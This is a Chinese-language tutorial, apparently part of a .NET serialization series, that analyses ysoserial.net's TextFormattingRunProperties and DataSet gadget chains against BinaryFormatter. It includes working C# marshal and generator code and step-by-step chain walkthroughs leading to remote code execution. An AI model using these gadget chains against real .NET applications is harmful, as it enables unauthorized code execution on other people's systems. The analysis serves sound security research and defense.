# BinaryFormatter
BinaryFormatter将对象序列化为二进制流，命名空间位于`System.Runtime.Serialization.Formatters.Binary`。[微软文档](https://docs.microsoft.com/zh-cn/dotnet/standard/serialization/binaryformatter-security-guide)也已经标注了使用BinaryFormatter会造成严重的RCE漏洞。
# 命名空间结构
观察其实现，发现其有多个序列化和反序列化方法，并实现IRemotingFormatter,
IFormatter两个接口，序列化和反序列化的用法，以及代理选择器在第一节《dotnet serialize 101》中已经讲解过，这里不再赘述。
# 攻击链
ysoserial.net中所有的gadget都支持BinaryFormatter，其原因必须提到TextFormattingRunProperties链，也得益于TextFormattingRunProperties链条而衍生出多个其他链。接下来我们来看几个ysoserial.net的反序列化链。
## TextFormattingRunProperties
查看ysoserial.net中TextFormattingRunPropertiesGenerator生成类的定义，发现TextFormattingRunPropertiesMarshal类对象实现了对TextFormattingRunProperties类的重定义序列化过程，将`_xaml`字段赋值给`ForegroundBrush`字段。
使用dnspy反编译看下ForegroundBrush字段到底有什么猫腻。该DLL位置在ysoserial.net工具中就有，路径为`ysoserial.net\ysoserial\dlls\Microsoft.PowerShell.Editor.dll`。
测试代码如下，编译出来使用dnspy调试。
    using System;
    using System.IO;
    using System.Runtime.Serialization;
    using System.Runtime.Serialization.Formatters.Binary;
    using Microsoft.VisualStudio.Text.Formatting;
    namespace BinaryFormatterSerialize
    {
        [Serializable]
        public class TextFormattingRunPropertiesMarshal : ISerializable
        {
            protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
            {
            }
            string _xaml;
            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                Type typeTFRP = typeof(TextFormattingRunProperties);
                info.SetType(typeTFRP);
                info.AddValue("ForegroundBrush", _xaml);
            }
            public TextFormattingRunPropertiesMarshal(string xaml)
            {
                _xaml = xaml;
            }
        }
        class Program
        {
            static void Main(string[] args)
            {
                string xaml_payload = File.ReadAllText(@"C:\Users\ddd\source\repos\xml.txt");
                TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    // 构建formatter
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    binaryFormatter.Serialize(memoryStream, payload);
                    memoryStream.Position = 0;
                    binaryFormatter.Deserialize(memoryStream);
                }
                Console.ReadKey();
            }
        }
    }
引用`ysoserial.net\ysoserial\dlls\Microsoft.PowerShell.Editor.dll`时项目的dotnet版本应为dotnet4.5
找到命名空间`Microsoft.VisualStudio.Text.Formatting`，在序列化构造函数中下一个断点。
发现TextFormattingRunProperties实现ISerializable接口，在其序列化的构造函数中，进行`this.GetObjectFromSerializationInfo("ForegroundBrush",
info)`。跟进看下
看见了什么？`XamlReader.Parse(@string)`，那这就接上了我们前文《XmlSerializer》中的ObjectDataProvider的链。
如此一来整个链就通了：
  1. 自写一个TextFormattingRunPropertiesMarshal类实现ISerializable接口
  2. 在GetObjectData序列化时给ForegroundBrush字段赋值为xaml的payload，并且将对象类型赋值为TextFormattingRunProperties类。
  3. 在反序列化时触发反序列化构造函数
  4. 反序列化构造函数触发XamlReader.Parse(payload) RCE
限制在于Microsoft.PowerShell.Editor.dll。原作者说明：
> 该库是PowerShell的一部分，该PowerShell已预安装在从Windows Server 2008 R2和Windows
> 7开始的所有Windows版本中。
## DataSet
看下ysoserial.net的payload
    [Serializable]
    public class DataSetMarshal : ISerializable
    {
        byte[] _fakeTable;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(System.Data.DataSet));
            info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
            info.AddValue("DataSet.DataSetName", "");
            info.AddValue("DataSet.Namespace", "");
            info.AddValue("DataSet.Prefix", "");
            info.AddValue("DataSet.CaseSensitive", false);
            info.AddValue("DataSet.LocaleLCID", 0x409);
            info.AddValue("DataSet.EnforceConstraints", false);
            info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection)null);
            info.AddValue("DataSet.Tables.Count", 1);
            info.AddValue("DataSet.Tables_0", _fakeTable);
        }
        public void SetFakeTable(byte[] bfPayload)
        {
            _fakeTable = bfPayload;
        }
        public DataSetMarshal(byte[] bfPayload)
        {
            SetFakeTable(bfPayload);
        }
        public DataSetMarshal(object fakeTable):this(fakeTable, new InputArgs())
        {
            // This won't use anything we might have defined in ysoserial.net BinaryFormatter process (such as minification)
        }
        public DataSetMarshal(object fakeTable, InputArgs inputArgs)
        {
            MemoryStream stm = new MemoryStream();
            if (inputArgs.Minify)
            {
                ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal = new ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();
                fmtLocal.Serialize(stm, fakeTable);
            }
            else
            {
                BinaryFormatter fmt = new BinaryFormatter();
                fmt.Serialize(stm, fakeTable);
            }
            SetFakeTable(stm.ToArray());
        }
        public DataSetMarshal(MemoryStream ms)
        {
            SetFakeTable(ms.ToArray());
        }
    }
    public class DataSetGenerator:GenericGenerator
    {
        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] init_payload = (byte[]) new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
            DataSetMarshal payloadDataSetMarshal = new DataSetMarshal(init_payload);
            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            { 
                return Serialize(payloadDataSetMarshal, formatter, inputArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
生成序列化数据的GetObjectData方法做了以下操作
  1. type设置为System.Data.DataSet
  2. DataSet.RemotingFormat 设置为binary格式
  3. 将DataSet.Tables_0设置为序列化之后的TextFormattingRunPropertiesGenerator byte数组
  4. DataSet.Tables.Count 赋值为1
那么反序列化的时候我们需要关注DataSet类的序列化构造函数，分析如下
在DataSet的序列化构造函数采用了this()方法重载`DataSet(SerializationInfo info, StreamingContext
context, bool ConstructSchema)`
默认赋值serializationFormat和schemaSerializationMode分别为Xml和IncludeSchema。然后遍历info信息判断赋值DataSet.RemotingFormat为Binary
SchemaSerializationMode.DataSet在我们构造的反序列化对象中并不存在，所以仍会保持值为`SchemaSerializationMode.IncludeSchema`。当DataSet.RemotingFormat为Binary时会进入`this.DeserializeDataSet(info,
context, serializationFormat, schemaSerializationMode);`
这个方法中会反序列化Schema和对应的Data
当schemaSerializationMode==SchemaSerializationMode.IncludeSchema时会进行BinaryFormatter.Deserialize()，条件满足，所以这时候需要看下memoryStream中buffer的来源。
    byte[] buffer = (byte[])info.GetValue(string.Format(CultureInfo.InvariantCulture, "DataSet.Tables_{0}", new object[] { i }), typeof(byte[]));
其中i来自`int @int =
info.GetInt32("DataSet.Tables.Count");`，所以`info.GetValue()`取的是DataSet.Tables_0字段的值，类型为byte数组。而在294行还有一步`this.DeserializeDataSetProperties(info,
context);`
在这里get了一些结构的信息，这里我们构造的时候也要加上，不然294行会报错，导致走不到Deserialize()。
那么现在就清晰了，DataSet.Tables_0字段的byte数组会被自动反序列化，我们可以将TextFormattingRunProperties生成的byte数组赋值给DataSet.Tables_0字段，然后就可以RCE了。
整个流程：
  1. 生成TextFormattingRunProperties的payload转byte数组存放到DataSet.Tables_0字段
  2. 填充DataSet的其他字段满足反序列化条件使其不报错
  3. 进入DataSet的反序列化构造函数DeserializeDataSet 该函数自动反序列化其中的Schema和Data
  4. 在DeserializeDataSetSchema()中获取DataSet.Tables_0字段的值进行BinaryFormatter.Deserialize()。
这条链的限制也很明了，依赖于TextFormattingRunProperties。